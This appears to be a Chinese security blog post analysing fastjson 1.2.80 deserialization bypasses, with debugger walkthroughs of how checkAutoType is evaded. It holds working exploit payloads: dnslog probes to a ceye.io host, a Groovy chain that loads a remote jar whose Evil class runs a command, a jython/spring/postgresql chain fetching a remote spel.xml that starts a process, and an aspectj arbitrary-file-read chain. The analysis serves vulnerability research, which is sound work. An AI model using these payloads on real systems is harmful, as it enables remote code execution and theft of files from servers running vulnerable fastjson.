+<h1 id="fastjson-1-2-80"><a href="#fastjson-1-2-80" class="headerlink" title="fastjson-1.2.80"></a>fastjson-1.2.80</h1><h2 id="1-2-68修复"><a href="#1-2-68修复" class="headerlink" title="1.2.68修复"></a>1.2.68修复</h2><p>对过滤的expectClass进行了修改，与1.2.68相比，新增了3个新的类，并且将原来的Class类型的判断修改为hash的判断。</p>
+<p><img src="/images/20230524140253.png"></p>
+<p><img src="/images/20230524135702.png"></p>
+<p>查询<a target="_blank" rel="noopener" href="https://github.com/LeadroyaL/fastjson-blacklist">黑名单</a>,分别为：</p>
+<ol>
+<li>java.lang.Runnable</li>
+<li>java.lang.Readable</li>
+<li>java.lang.AutoCloseable</li>
+</ol>
+<p>把AutoCloseable禁了，在1.2.68分析的时候还提到了一个利用类：Throwable.class</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;1.zj96tn.ceye.io&quot;&#125;&#125;&#125;
+</code></pre>
+<h3 id="版本探测-2"><a href="#版本探测-2" class="headerlink" title="版本探测-2"></a>版本探测-2</h3><pre><code>&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;1.zj96tn.ceye.io&quot;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONException&quot;,&quot;message&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;2.zj96tn.ceye.io&quot;&#125;&#125;&#125;&#125;
+</code></pre>
+<h3 id="报错探测依赖库"><a href="#报错探测依赖库" class="headerlink" title="报错探测依赖库"></a>报错探测依赖库</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.lang.Character&quot;&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mysql.jdbc.Driver&quot;&#125;
+</code></pre>
+<h3 id="dnslog探测依赖库"><a href="#dnslog探测依赖库" class="headerlink" title="dnslog探测依赖库"></a>dnslog探测依赖库</h3><pre><code>&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;country&quot;:&quot;zj96tn.ceye.io&quot;,&quot;language&quot;:&#123;&quot;@type&quot;:&quot;java.lang.String&quot;&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.python.antlr.ParseException&quot;&#125;&#125;&#125;&#125;&#125;
+</code></pre>
+<h3 id="grovvy"><a href="#grovvy" class="headerlink" title="grovvy"></a>grovvy</h3><p>maven依赖：</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
+    &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;
+    &lt;version&gt;3.0.13&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>利用：</p>
+<pre><code>//两次parse
+&#123;
+&quot;@type&quot;:&quot;java.lang.Exception&quot;,
+&quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilationFailedException&quot;,
+&quot;unit&quot;:&#123;&#125;
+&#125;
+
+&#123;
+&quot;@type&quot;:&quot;org.codehaus.groovy.control.ProcessingUnit&quot;,
+&quot;@type&quot;:&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit&quot;,
+&quot;config&quot;:&#123;
+&quot;@type&quot;:&quot;org.codehaus.groovy.control.CompilerConfiguration&quot;,
+&quot;classpathList&quot;:&quot;http://127.0.0.1:8080/&quot;
+&#125;
+&#125;
+</code></pre>
+<p>poc：</p>
+<pre><code>//1.2.76-1.2.80
+public class FastJson_Groovy_Gadget_Test &#123;
+    private static String poc1 = &quot;&#123;\n&quot; +
+            &quot;    \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot; +
+            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilationFailedException\&quot;,\n&quot; +
+            &quot;    \&quot;unit\&quot;:&#123;&#125;\n&quot; +
+            &quot;&#125;&quot;;
+    private static String poc2 = &quot;&#123;\n&quot; +
+            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.ProcessingUnit\&quot;,\n&quot; +
+            &quot;    \&quot;@type\&quot;:\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\&quot;,\n&quot; +
+            &quot;    \&quot;config\&quot;:&#123;\n&quot; +
+            &quot;        \&quot;@type\&quot;:\&quot;org.codehaus.groovy.control.CompilerConfiguration\&quot;,\n&quot; +
+            &quot;        \&quot;classpathList\&quot;:\&quot;http://127.0.0.1:8000/attack-1.jar\&quot;\n&quot; +
+            &quot;    &#125;\n&quot; +
+            &quot;&#125;&quot;;
+    public static void main(String[] args) throws IOException &#123;
+        try &#123;
+            JSON.parseObject(poc1);
+        &#125; catch (Exception e)&#123;&#125;
+        JSON.parseObject(poc2);
+    &#125;
+&#125;
+</code></pre>
+<p>恶意server（attack-1.jar）：</p>
+<pre><code>import org.codehaus.groovy.ast.ASTNode;
+import org.codehaus.groovy.control.CompilePhase;
+import org.codehaus.groovy.control.SourceUnit;
+import org.codehaus.groovy.transform.ASTTransformation;
+import org.codehaus.groovy.transform.GroovyASTTransformation;
+import java.io.IOException;
+@GroovyASTTransformation(phase= CompilePhase.CONVERSION)
+public class Evil implements ASTTransformation &#123;
+    public Evil() &#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (IOException e) &#123;
+        &#125;
+    &#125;
+    @Override
+    public void visit(ASTNode[] nodes, SourceUnit source) &#123;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>第一次parse：</p>
+<p>当第一次传递的<code>@type</code>为<code>java.lang.Exception</code>，<code>checkAutoType</code>中因为<code>java.lang.Exception</code>在<code>mappings</code>中可以直接return。<code>clazz</code>获取到<code>java.lang.Exception</code>的class对象。<br><img src="/images/20230528215252.png"></p>
+<p>由于<code>java.lang.Exception</code>继承自<code>Throwable</code> ，通过<code>getDeserializer</code> 函数拿到<code>Throwable</code> 的反序列化器<code>ThrowableDeserializer</code><br><img src="/images/20230528215840.png"></p>
+<p>拿到反序列化器<code>ThrowableDeserializer</code> 后，继而调用序列化器接口方法<code>deserialze</code> 对后续json字符串进行反序列化<br><img src="/images/20230528220048.png"></p>
+<p>在<code>ThrowableDeserializer#deserialze</code> 方法内，会对新的<code>@type</code>字段指向的类进行<code>checkAutoType</code>校验：传递<code>@type</code>字段作为其<code>typename</code>参数、<code>Throwable.class</code> 作为其<code>expectClass</code> 参数<br><img src="/images/20230528220255.png"></p>
+<p>传递了期望类<code>Throwable.class</code>，在经过<code>if (autoTypeSupport || jsonType || expectClassFlag)</code> 时判断，利用<code>TypeUtils.loadClass</code> 获得<code>org.codehaus.groovy.control.CompilationFailedException</code>类对象。</p>
+<p><img src="/images/20230528220530.png"></p>
+<p>在后面会判断<code>clazz</code>类对象是否和<code>expectClass</code>期望类实现同一接口，如果是就添加到mappings中并return。</p>
+<p><img src="/images/20230528221107.png"></p>
+<p>回到<code>ThrowableDeserializer#deserialze</code>，之后他会去通过json数据中参数值获取对应解析器中对应的属性，<code>fieldInfo</code> 的对象，里面封装了属性名、属性值、属性类对象信息等。这里获取到<code>CompilationFailedException.unit</code>属性，类型为<code>ProcessingUnit</code>。</p>
+<p><img src="/images/20230528221603.png"><br><img src="/images/20230528222044.png"></p>
+<p>如果属性值不是属性类型的实例的话就会调用<code>TypeUtils.cast</code>方法，这个方法是重点。<br><img src="/images/20230528222349.png"></p>
+<p>在<code>cast</code>方法中，会经过一些列的判断，最后因为我们传入的值JsonObject为空，他会调用到<code>config.getDeserializer(clazz)</code>，里面在获取反序列化解析器的时候会调用<code>putDeserializer(type, deserializer)</code>,将<code>type</code>和<code>deserializer</code>加入到<code>ParserConfig.deserializers</code>。这时成员类型<code>ProcessingUnit</code>就被加入到<code>deserializers</code>中。</p>
+<p><img src="/images/20230528223122.png"><br><img src="/images/20230528223343.png"></p>
+<p>之后调用<code>javaBeanDeser.createInstance</code>创建实例并返回，由于我们传入的是空，所以返回空</p>
+<p><img src="/images/20230528224010.png"></p>
+<p>需要注意的是，赋值给<code>value</code>后会调用<code>fieldDeserializer.setValue(ex, value)</code>进行设置，但是如果赋值空的话就会报错，所以在poc中需要try catch处理</p>
+<p><img src="/images/20230528224318.png"></p>
+<p>第二次parse:</p>
+<p>@type字段指向<code>CompilationFailedException</code>的成员类型<code>ProcessingUnit</code>。由于<code>ProcessingUnit</code> 生成的反序列化器添加到<code>ParserConfig</code>中，在#1445行能够获取到<code>ProcessingUnit</code>类对象。<br><img src="/images/20230528224525.png"></p>
+<p>之后利用这个反序列化器<code>ProcessingUnitJavaBeanDeserializer#deserialize</code>实现后续的json反序列化，并将<code>ProcessingUnit</code> 作为<code>expectClass</code>使用。</p>
+<p><img src="/images/20230528225017.png"></p>
+<p>凡继承自<code>ProcessingUnit</code> 的类都能被反序列化而绕过<code>checkAutoType</code>，例如我们使用的sink类<code>JavaStubCompilationUnit</code>。</p>
+<p><img src="/images/20230528225124.png"></p>
+<p>之后创建<code>JavaStubCompilationUnit</code>的<code>deserializer</code>，然后它的调用<code>deserialze</code>方法，<code>JavaStubCompilationUnit</code>没有无参构造，解析器会从json从获取参数的值，并调用他的有参构造器</p>
+<p><img src="/images/20230528231101.png"></p>
+<p>构造器中会不断调用父类的构造器，将JSON字符串中classpathList属性的值添加到classpath。</p>
+<p><img src="/images/20230528231235.png"><br><img src="/images/20230528231713.png"></p>
+<p>添加调用栈：</p>
+<pre><code>&lt;init&gt;:167, GroovyClassLoader (groovy.lang)
+&lt;init&gt;:183, GroovyClassLoader (groovy.lang)
+lambda$setClassLoader$0:106, ProcessingUnit (org.codehaus.groovy.control)
+run:-1, 1227074340 (org.codehaus.groovy.control.ProcessingUnit$$Lambda$1)
+doPrivileged:-1, AccessController (java.security)
+setClassLoader:103, ProcessingUnit (org.codehaus.groovy.control)
+&lt;init&gt;:64, ProcessingUnit (org.codehaus.groovy.control)
+&lt;init&gt;:180, CompilationUnit (org.codehaus.groovy.control)
+&lt;init&gt;:161, CompilationUnit (org.codehaus.groovy.control)
+&lt;init&gt;:46, JavaStubCompilationUnit (org.codehaus.groovy.tools.javac)
+</code></pre>
+<p>在<code>CompilationUnit</code>的构造函数中super调用完后，会调用<code>addPhaseOperations()</code><br><img src="/images/20230528232421.png"></p>
+<p>其中调用<code>ASTTransformationVisitor.addPhaseOperations(this)</code></p>
+<p><img src="/images/20230528232607.png"></p>
+<p>调用<code>addGlobalTransforms(context)</code></p>
+<p><img src="/images/20230528232640.png"></p>
+<p>调用<code>doAddGlobalTransforms(context, true)</code>，主要看这个类</p>
+<p><img src="/images/20230528232721.png"></p>
+<p><code>transformLoader</code>是从<code>JavaStubCompilationUnit</code>对象中获取到的<code>GroovyClassLoader</code>，使用<code>getResources(String name)</code>从加载器中获取<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>文件下的资源</p>
+<p><img src="/images/20230529194517.png"></p>
+<p>跟进<code>getResources(String name)</code>，先从父类加载器加载，使用启动类加载器加载时，会从 Bootstrap classpath 对应的 jar 包或目录中加载资源。</p>
+<p><img src="/images/20230529195111.png"></p>
+<p><code>getBootstrapClassPath()</code>最终获取到的时<code>bcp</code>属性的值，也就是说从<code>bcp</code>中的 jar 包中加载资源</p>
+<p><img src="/images/20230529195300.png"></p>
+<p>然后回到<code>getResources</code>调用<code>findResources(name)</code>，调用<code>ucp</code>的<code>findResources()</code>，<code>ucp</code>是 URLClassPath 类型，里面存着我们的恶意远程server地址，封装成<code>Enumeration</code>对象返回。</p>
+<p><img src="/images/20230529200158.png"></p>
+<p>接下来会遍历这些<code>Enumeration</code>，获取存在<code>META-INF/services/org.codehaus.groovy.transform.ASTTransformation</code>资源的service</p>
+<p><img src="/images/20230529200512.png"></p>
+<p>读取service中不以<code>#</code>开头的行放到<code>transformNames</code></p>
+<p><img src="/images/20230529200653.png"></p>
+<p>接着下面调用addPhaseOperationsForGlobalTransforms(context.getCompilationUnit(), transformNames, isFirstScan)</p>
+<p><img src="/images/20230529201006.png"></p>
+<p>在该方法中依次加载并实例化了<code>transformNames</code>中的所有类，并且这些类需要:</p>
+<ol>
+<li>含有<code>@GroovyASTTransformation</code>注解</li>
+<li>继承自<code>ASTTransformation</code></li>
+</ol>
+<p><img src="/images/20230529200948.png"></p>
+<blockquote>
+<p>1.2.76以下不适用原因:因为在1.2.76版本下没有cast调用</p>
+</blockquote>
+<h3 id="jython-spring-context-postgresql"><a href="#jython-spring-context-postgresql" class="headerlink" title="jython+spring-context+postgresql"></a>jython+spring-context+postgresql</h3><p>依赖：</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
+    &lt;version&gt;5.0.2.RELEASE&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+    &lt;groupId&gt;org.jvnet.hudson.plugins&lt;/groupId&gt;
+    &lt;artifactId&gt;jython&lt;/artifactId&gt;
+    &lt;version&gt;1.1&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+    &lt;groupId&gt;org.postgresql&lt;/groupId&gt;
+    &lt;artifactId&gt;postgresql&lt;/artifactId&gt;
+    &lt;version&gt;42.3.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>利用：</p>
+<pre><code>public class FastJson_Jython_Pgsql_Gadget_Test &#123;
+    public static void main(String[] args) &#123;
+        String jsonStr = &quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.python.antlr.ParseException\&quot;,\&quot;type\&quot;:&#123;&#125;&#125;,&quot; +
+                &quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;org.python.core.PyObject\&quot;,\&quot;@type\&quot;:\&quot;com.ziclix.python.sql.PyConnection\&quot;,&quot; +
+                &quot;\&quot;connection\&quot;:&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.postgresql.jdbc.PgConnection\&quot;,&quot; +
+                &quot;\&quot;hostSpecs\&quot;:[&#123;\&quot;host\&quot;:\&quot;127.0.0.1\&quot;,\&quot;port\&quot;:2333&#125;],&quot; +
+                &quot;\&quot;user\&quot;:\&quot;1azy\&quot;, \&quot;database\&quot;:\&quot;test\&quot;,&quot; +
+                &quot;\&quot;info\&quot;:&#123;&quot; +
+                &quot;\&quot;socketFactory\&quot;:\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;,&quot; +
+                &quot;\&quot;socketFactoryArg\&quot;:\&quot;http://127.0.0.1:8000/spel.xml\&quot;&quot; +
+                &quot;&#125;,&quot; +
+                &quot;\&quot;url\&quot;:\&quot;\&quot;&quot; +
+                &quot;&#125;&quot; +
+                &quot;&#125;&quot; +
+                &quot;&#125;&quot;;
+
+        JSONObject obj1 = JSON.parseObject(jsonStr);
+    &#125;
+&#125;
+</code></pre>
+<p>spel.xml:</p>
+<pre><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+xsi:schemaLocation=&quot;
+http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
+&lt;constructor-arg value=&quot;calc.exe&quot; /&gt;
+&lt;property name=&quot;whatever&quot; value=&quot;#&#123; pb.start() &#125;&quot;/&gt;
+&lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre>
+<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><code>ParseException</code>继承自<code>RuntimeException</code>，<code>RuntimeException</code>自<code>Throwable</code>，其中有个<code>PyObject</code>类型的属性type</p>
+<p><img src="/images/20230531174857.png"></p>
+<p><code>PyConnection</code>继承自<code>PyObject</code>，有个<code>Connection</code>类型的属性<code>connection</code></p>
+<p><img src="/images/20230531175117.png"></p>
+<p><code>PgConnection</code>实现了<code>BaseConnection</code>，<code>BaseConnection</code>继承自<code>Connection</code>接口，并且有个五个参数的构造函数，可以连接数据库。</p>
+<p><img src="/images/20230531175404.png"></p>
+<p>info内传入<code>socketFactory</code>为<code>ClassPathXmlApplicationContext</code>，<code>socketFactoryArg</code>为远程 bean 文件地址。在<code>getSocketFactory</code>方法内会对取出这些值，并调用<code>ObjectFactory.instantiate</code>实例化</p>
+<p><img src="/images/20230531180757.png"></p>
+<p>调试分析：</p>
+<p>和groovy链一样的就不跟了，<code>ParseException</code>继承自<code>Exception</code>绕过<code>checkAutoType</code>，调用<code>TypeUtils.cast</code>把<code>type</code>属性传入，将<code>PyObject</code>类型保存到<code>this.deserializer</code>，不一样的是<code>PyObject</code>有无参构造，可以实例化，返回的<code>value</code>不为 null，所以下面调用<code>setValue()</code>不会报错，所以不用像 Groovy 链那样使用<code>try-catch</code>。  </p>
+<p><img src="/images/20230531182921.png"><br><img src="/images/20230531183107.png"></p>
+<p>之后通过<code>PyObject</code>对应的<code>deserializer</code>绕过<code>checkAutoType()</code>，然后通过<code>PyObject</code>作为<code>expectClass</code>绕过<code>checkAutoType()</code>，加载并返回<code>PyConnection</code></p>
+<p><img src="/images/20230531183608.png"><br><img src="/images/20230531183634.png"></p>
+<p>之后获取反序列器-&gt;反序列化-&gt;解析属性，跟进<code>JavaBeanDeserializer.deserialze()</code> -&gt; <code>DefaultFieldDeserializer.parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code>，返回<code>JavaBeanDeserializer</code>类型；  </p>
+<p><img src="/images/20230531184633.png"></p>
+<p>调用<code>fieldValueDeserilizer.deserialze</code>解析</p>
+<p><img src="/images/20230531184758.png"></p>
+<p>期望类为<code>java.sql.Connection</code>，typeName为<code>org.postgresql.jdbc.PgConnection</code>调用<code>checkAutoType</code>绕过，加载并返回<code>org.postgresql.jdbc.PgConnection</code></p>
+<p><img src="/images/20230531185224.png"></p>
+<p>调用<code>deserializer.deserialze</code>，下面会去遍历参数，当遍历到<code>HostSpecs</code>，会调用<code>parseField</code>—&gt;<code>getFieldValueDeserilizer</code>获取反序列化器，返回<code>ObjectArrayCode</code></p>
+<p><img src="/images/20230531185832.png"></p>
+<p>调用<code>ObjectArrayCode.deserialze</code>去反序列化</p>
+<p><img src="/images/20230531190031.png"></p>
+<p>跟进<code>parser.parseArray</code>，调用<code>deserializer.deserialze</code></p>
+<p><img src="/images/20230531190253.png"></p>
+<p>通过参数实例化了<code>HostSpec</code>对象并返回</p>
+<p><img src="/images/20230531190410.png"></p>
+<p>转换为数组类型，赋值给<code>hostSpecs</code>参数</p>
+<p><img src="/images/20230531190907.png"></p>
+<p>接着解析<code>info</code>属性，调用<code>getFieldValueDeserilizer</code>获取到解析器<code>MapDeserilizer</code></p>
+<p><img src="/images/20230531192000.png"></p>
+<p>调用<code>MapDeserilizer.deserialze</code>，其中调用了<code>parser.parseObject</code>，将<code>socketFactory</code>和<code>socketFactoryArg</code>的存入了 map 中</p>
+<p><img src="/images/20230531192349.png"></p>
+<p>然后将<code>value</code>放入<code>info</code>中，其他几个String参数也是一样</p>
+<p><img src="/images/20230531192507.png"></p>
+<p>接着调用五个参数的构造方法去实例化<code>PgConnection</code></p>
+<p><img src="/images/20230531192656.png"></p>
+<p>跟进到<code>PgConnection</code>的构造函数，调用了<code>ConnectionFactory.openConnection()</code></p>
+<p><img src="/images/20230531192802.png"></p>
+<p>跟进<code>connectionFactory.openConnectionImpl</code>-&gt;<code>SocketFactoryFactory.getSocketFactory</code>-&gt;<code>ObjectFactory.instantiate</code>，其中会去反射获取传入的<code>ClassPathXmlApplicationContext</code>的类并实例化，参数为<code>http://127.0.0.1:8000/spel.xml</code></p>
+<p><img src="/images/20230531193213.png"></p>
+<p>加载配置文件，实例化文件中的恶意对象。</p>
+<p><img src="/images/20230531193327.png"></p>
+<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>依赖：</p>
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
+    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
+    &lt;version&gt;1.8.6&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>利用：</p>
+<pre><code>public class FastJson_Aspectj_ReadFile_Gadget_Test &#123;
+    public static void main(String[] args) &#123;
+        String jsonStr1 = &quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;&#125;&quot;;
+
+        String jsonStr2 = &quot;&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +
+                &quot;\&quot;val\&quot;:&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,&quot; +
+                &quot;&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\&quot;,&quot; +
+                &quot;\&quot;newAnnotationProcessorUnits\&quot;:[&#123;&#125;]&quot; +
+                &quot;&#125;&quot; +
+                &quot;&#125;&quot; +
+                &quot;&#125;&quot;;
+
+        String jsonStr3 = &quot;&#123;\&quot;x\&quot;:&#123;&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\&quot;,&quot; +
+                &quot;\&quot;@type\&quot;:\&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\&quot;,&quot; +
+                &quot;\&quot;fileName\&quot;:\&quot;E:/a/12.txt\&quot;&quot; +
+                &quot;&#125;&quot; +
+                &quot;&#125;&quot;;
+
+        JSON.parseObject(jsonStr1);
+        try &#123;
+            JSON.parseObject(jsonStr2);
+        &#125; catch (Exception e)&#123;
+            Object obj3 = JSON.parseObject(jsonStr3);
+            System.out.println(obj3);
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>由于<code>SourceTypeCollisionException</code>的<code>newAnnotationProcessorUnits</code>参数是接口类型</p>
+<p><img src="/images/20230531203048.png"></p>
+<p>调用<code>cast</code>会返回对应的代理对象，无法通过上面的方法将<code>ICompilationUnit</code> put 进<code>this.deserializer</code>。</p>
+<p><img src="/images/20230531203417.png"></p>
+<p>jsonStr1 中不添加<code>newAnnotationProcessorUnits</code>参数，它的作用是把<code>SourceTypeCollisionException</code>添加进<code>mapping</code>，以便后面使用。</p>
+<p><code>MiscCodec.deserialze()</code>中调用了<code>toJavaObject()</code>，可以把数组类型的参数转换成 Java 对象，然后把该参数类型 put 进<code>this.deserializer</code>；<br><code>MapDeserializer.deserialze()</code>可以把传入的各参数的值赋给对应的对象；</p>
+<p>jsonStr2 中 各类对应的<code>deserializer</code>如下：</p>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>deserializer</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>java.lang.Class</td>
+<td>MiscCodec</td>
+</tr>
+<tr>
+<td>com.alibaba.fastjson.JSONObject</td>
+<td>MapDeserializer</td>
+</tr>
+</tbody></table>
+<p>jsonStr2 的作用就是将<code>org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>类型 put 进<code>this.deserializer</code>；  </p>
+<p>jsonStr3 的作用就是利用<code>BasicCompilationUnit</code>类中的<code>getContents()</code>方法来读取文件内容；<br><code>&quot;x&quot;:&#123;&#125;</code>的作用是将<code>BasicCompilationUnit</code>对象序列化为 JSON 数据</p>
+<p>调试分析：</p>
+<p>jsonStr1通过期望类绕过<code>checkAutoType()</code>，并调用 <code>TypeUtils.addMapping</code>将<code>org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException</code>保存进<code>mapping</code></p>
+<p><img src="/images/20230531204554.png"></p>
+<p>开始对jsonStr2反序列化，<code>java.lang.Class</code>在<code>mappings</code>中，通过<code>checkAutoType</code></p>
+<p><img src="/images/20230531204759.png"></p>
+<p>获取反序列器为<code>MiscCodec</code>，调用<code>MiscCodec.deserialze</code></p>
+<p><img src="/images/20230531204954.png"></p>
+<p><code>MiscCodec.deserialze</code>中调用<code>parser.parse()</code>-&gt;<code>parseObject(object, fieldName)</code>，其中获取到@type的值为<code>JSONObject</code>后会绕过<code>checkAutoType</code></p>
+<p><img src="/images/20230531210053.png"></p>
+<p>然后获取<code>JSONObject</code>的解析器<code>MapDeserializer</code>,调用<code>MapDeserializer.deserialze</code></p>
+<p><img src="/images/20230531211015.png"></p>
+<p>获取到<code>java.lang.String</code>，然后调用<code>StringCode.deserialze()</code>，返回<code>@type</code></p>
+<p><img src="/images/20230531211114.png"></p>
+<p>将后面两个参数放入map中</p>
+<p><img src="/images/20230531211348.png"><br><img src="/images/20230531211603.png"></p>
+<p>返回到<code>MiscDeserializer</code>，调用<code>jsonObject.toJavaObject</code>，</p>
+<p><img src="/images/20230531211920.png"></p>
+<p>跟进<code>toJavaObject()</code> -&gt; <code>TypeUtils.cast()</code> -&gt; <code>cast()</code> -&gt; <code>castToJavaBean()</code>，获取<code>SourceTypeCollisionException</code>带入<code>checkAutoType()</code>，从<code>mapping</code>中获取并返回 clazz；<br>然后又调用<code>castToJavaBean()</code>；</p>
+<p><img src="/images/20230531213322.png"></p>
+<p>之后在创建实例的时候会去解析里面的参数，跟进<code>createInstance()</code>，获取到<code>ICompilationUnit[]</code>类型的参数<code>newAnnotationProcessorUnits</code>，调用<code>parseField()</code> -&gt; <code>getFieldValueDeserilizer()</code> -&gt; <code>getDeserializer()</code>，得到<code>ObjectArrayCode</code>类型的<code>deserializer</code>，这里的<code>type</code>是带<code>[L...;</code>字符的；<br><img src="/images/20230531213659.png"></p>
+<p>调用<code>ObjectArrayCode.deserialize()</code>，获取到<code>interface org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>，带入<code>parseArray()</code>，<code>getDeserializer()</code>将<code>ICompilationUnit</code>接口类型的<code>deserializer</code> put 进<code>this.deserializer</code>。</p>
+<p><img src="/images/20230531214228.png"></p>
+<p>然后在<code>parser.close()</code>-&gt;<code>lexer.close()</code>，关闭的时候会因为没有闭合抛出异常，进入catch</p>
+<p><img src="/images/20230531214544.png"></p>
+<p>然后开始解析第三个序列化字符串，因为<code>org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit</code>已经put进<code>deserializers</code>，成功绕过<code>checkAutoType</code></p>
+<p><img src="/images/20230531214712.png"></p>
+<p>之后获取解析器，调用deserialze，<code>ICompilationUnit</code>作为期望类绕过<code>BasicCompilationUnit</code>的<code>checkAutoType</code>。</p>
+<p><img src="/images/20230531215003.png"></p>
+<p>继续获取解析器，调用deserialze，解析参数放入params，调用有参构造</p>
+<p><img src="/images/20230531215218.png"></p>
+<p>有参构造中调用父类的构造器，将参数写入fileName属性中</p>
+<p><img src="/images/20230531215438.png"></p>
+<p>最后得到<code>JsonObject</code>对象后返回，<code>println()</code>会调用<code>JsonObject</code>对象的<code>toString</code>方法，调用<code>valueOf</code>-&gt;<code>toString()</code>-&gt;<code>toJSONString()</code>-&gt;<code>write(Object object)</code>-&gt;<code>MapSerializer#write</code>-&gt;<code>preWriter.write</code></p>
+<p><img src="/images/20230531224654.png"></p>
+<p>在方法中会序列化所有的属性，当序列化<code>contents</code>属性时，调用<code>getContents</code>方法</p>
+<p><img src="/images/20230531224749.png"></p>
+<p><code>getContents()</code>方法中会调用<code>getFileCharContent</code>，在参数中new了File对象传入</p>
+<p><img src="/images/20230531225037.png"></p>
+<p><code>getFileCharContent</code>方法中，新建了文件输入流，读取文件中的内容</p>
+<p><img src="/images/20230531225313.png"></p>
+<p>最后得到返回值，写入流中。</p>
+<p><img src="/images/20230531225602.png"></p>
+<h1 id="不出网"><a href="#不出网" class="headerlink" title="不出网"></a>不出网</h1><ol>
+<li>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</li>
+<li>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
+</ol>
+<p>第一种需要使用Feature才能触发</p>
+<pre><code>new Feature[]&#123;Feature.SupportNonPublicField&#125;
+</code></pre>
+<p>第二种用到的是BCEL字节码然后使用classload进行加载。</p>
